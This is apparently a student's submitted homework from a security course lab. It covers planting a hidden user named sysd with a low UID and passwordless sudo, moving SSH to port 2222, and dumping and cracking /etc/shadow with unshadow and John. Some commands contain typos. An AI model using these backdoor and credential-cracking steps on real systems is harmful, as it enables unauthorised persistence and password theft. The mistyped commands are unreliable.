## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `sudo adduser sysd`

2. Give your secret user a password: 
    - `sudo passwd sysd`

3. Give your secret user a system UID < 1000:
    - `sudo usermon -u 333 sysd`

4. Give your secret user the same GID:
   - `sudo groupmod -g 333 sysd`

5. Give your secret user full `sudo` access without the need for a password:
   -  `sudo visudo` and then I added sysd ALL=(ALL) NOPASSWD:ALL at the end of the editor

6. Test that `sudo` access works without your password: sudo -l

  I also used sudo rm -r /home/sysd to remove the /Home/sysd directory. So that there is no home folder for my hacker 

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

sudo vi /etc/ssh/sshd_config
changed Port 22 to Port 2222
Saved it with :wq



**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    service ssh restart

2. Exit the `root` account:
   exits

3. SSH to the target machine using your `sysd` account and port `2222`:
    - ssh sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:
    - sudo su

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    -ssh sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

i did the following to get the passwords

cat /etc/passwd > funnyjokes.txt
cat /etc/shadow > funnyjokes2.txt
unshadow funnyjokes.txt funnyjokes2.txt > iwin.txt

john iwin.txtp
